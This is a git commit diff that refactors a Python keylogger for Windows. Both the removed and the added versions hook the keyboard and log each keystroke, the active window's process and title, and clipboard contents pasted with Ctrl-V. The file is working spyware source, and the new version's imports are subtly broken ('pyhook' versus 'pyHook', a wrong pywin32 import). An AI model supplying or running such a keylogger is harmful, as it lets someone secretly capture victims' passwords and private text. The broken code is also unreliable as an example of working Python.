cfa481abff048068239a7cf0e310990b80835507
Mislav <mislav@pop-os.localdomain>
2021-05-29 23:48:26 +0200

    Refactored

--- keylogger.py
+++ keylogger.py
@@ -1,74 +1,78 @@
-from ctypes import byref, create_string_buffer, c_ulong, windll
-from io import StringIO
-
+from ctypes import *
 import pythoncom
 import pyWinhook as pyhook
-import pywintypes as pywin32
-import sys
-import time
+from pywin32 import win32clipboard
 
-TIMEOUT = 60*10
+user32 = windll.user32
+kernel32 = windll.kernel32
+psapi = windll.psapi
+current_window = None
 
-class KeyLogger:
-    def __init__(self):
-        self.current_window = None
 
-    def get_current_process(self):
-        hwnd = windll.user32.GetForegroundWindow()
-        pid = c_ulong(0)
-        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
-        process_id = f"{pid.value}"
+def get_current_process():
+    # get a handle to the foreground window
+    hwnd = user32.GetForegroundWindow()
 
-        executable = create_string_buffer(512)
-        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid)
-        windll.psapi.GetModuleBaseNameA(
-            h_process, None, byref(executable), 512
-        )
+    # find the process ID
+    pid = c_ulong(0)
+    user32.GetWindowThreadProcessId(hwnd, byref(pid))
 
-        window_title = create_string_buffer(512)
-        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
-        try:
-            self.current_window = window_title.value.decode()
-        except UnicodeDecodeError as e:
-            print(f"{e}: window name unknown")
+    # store the current process ID
+    process_id = "%d" % pid.value
 
-        print("\n", process_id,
-            executable.value.decode(), self.current_window)
+    # grab the executable
+    executable = create_string_buffer(b'\x00' * 512)
+    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
 
-        windll.kernel32.CloseHandle(hwnd)
-        windll.kernel32.CloseHandle(h_process)
+    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
 
-    def mykeystroke(self, event):
-        if event.WindowName != self.current_window:
-            self.get_current_process()
-        if 32 < event.Ascii < 127:
-            print(chr(event.Ascii), end="")
+    # now read it's title
+    window_title = create_string_buffer(b'\x00' * 512)
+    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
+
+    # print out the header if we're in the right process
+    print()
+    print("[ PID: %s - %s - %s ]" % (process_id,
+                                     executable.value,
+                                     window_title.value)
+          )
+    print()
+
+    # close handles
+    kernel32.CloseHandle(hwnd)
+    kernel32.CloseHandle(h_process)
+
+
+def KeyStroke(event):
+    global current_window
+
+    # check to see if target changed windows
+    if event.WindowName != current_window:
+        current_window = event.WindowName
+        get_current_process()
+
+    # if they pressed a standard key
+    if 32 < event.Ascii < 127:
+        print(chr(event.Ascii), end=' ')
+    else:
+        # if [Ctrl-V], get the value on the clipboard
+        # added by Dan Frisch 2014
+        if event.Key == "V":
+            win32clipboard.OpenClipboard()
+            pasted_value = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+            print("[PASTE] - %s" % pasted_value, end=' ')
         else:
-            if event.Key == "V":
-                pywin32.win32clipboard.OpenClipboard()
-                value = pywin32.win32clipboard.GetClipboardData()
-                pywin32.win32clipboard.CloseClipboard()
-                print(f"[PASTE] - {value}")
-            else:
-                print(f"{event.Key}")
-        return True
+            print("[%s]" % event.Key, end=' ')
 
-def run():
-    save_stdout = sys.stdout
-    sys.stdout = StringIO()
+    # pass execution to next hook registered 
+    return True
 
-    kl = KeyLogger()
-    hm = pyhook.HookManager()
-    hm.KeyDown = kl.mykeystroke
-    hm.HookKeyboard()
 
-    while time.thread_time() < TIMEOUT:
-        pythoncom.PumpWaitingMessages()
+# create and register a hook manager
+kl = pyHook.HookManager()
+kl.KeyDown = KeyStroke
 
-    log = sys.stdout.getvalue()
-    sys.stdout = save_stdout
-    return log
-
-if __name__ == "__main__":
-    print(run())
-    print("done.")
+# register the hook and execute forever
+kl.HookKeyboard()
+pythoncom.PumpMessages()
